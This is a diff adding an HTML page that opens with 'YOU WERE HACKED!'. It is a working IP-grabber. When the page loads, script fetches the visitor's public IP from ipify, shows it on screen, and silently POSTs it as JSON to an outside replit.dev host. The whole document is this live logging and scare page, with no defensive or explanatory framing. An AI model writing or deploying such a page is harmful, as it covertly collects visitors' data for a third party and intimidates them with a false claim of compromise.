@@ -1,0 +1,70 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>None..</title>
+  <style>
+    body{
+      margin: 0;
+      background-color: black;
+    }
+    .text{
+      position: absolute;
+      top: 280px;
+      left: 10px;
+      font-size: 30px;
+      color: white;
+      font-weight: bold;
+      font-family: monospace;
+      color: lawngreen;
+    }
+    #ipfind{
+      background-color: white;
+      height: 35px;
+      background: none;
+      border: none;
+      color: red;
+      font-weight: bold;
+      font-family: monospace;
+      font-size: 30px;
+    }
+    
+  </style>
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.10.2/jquery.min.js"></script>
+  <script type="application/javascript" src="https://api.ipify.org?format=jsonp&callback=getIP"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.0.1/socket.io.js" integrity="sha512-q/dWJ3kcmjBLU4Qc47E4A9kTB4m3wuTY7vkFJDTZKjTs8jhyGQnaUrxa0Ytd0ssMZhbNua9hE+E7Qv1j+DyZwA==" crossorigin="anonymous"></script>
+   <script>
+   $(document).ready(function(){
+     const sendIp = async (ipuser) => {
+    try {
+        await fetch("https://66890570-bce6-42e5-aa16-d4fdf2d6ac8a-00-3uidqv6youqtd.janeway.replit.dev/", {
+            method: "POST",
+            headers: {
+                "Content-Type": "application/json"
+            },
+            body: JSON.stringify({ ip: ipuser })
+        });
+      console.log(":)")
+    } catch (erro) {
+        console.log(":(")
+    }
+};
+   $.getJSON("https://api.ipify.org?format=jsonp&callback=?",function(json){
+      $("#ipfind").val(`${json.ip}`)
+     sendIp(json.ip)
+})
+   })
+  </script>
+</head>
+<body>
+<div class="text"><spam>YOU WERE HACKED!</spam><br>
+<form method="POST">
+  <label for="ipfind">YOU IP: </label>
+  <input type="text" id="ipfind" name="ip" disabled/>
+  <p style="font-size: 30px; color: lawngreen; font-weight: bold; font-family: monospace;">None...</p>
+</form></div>
+</body>
+
+</html>
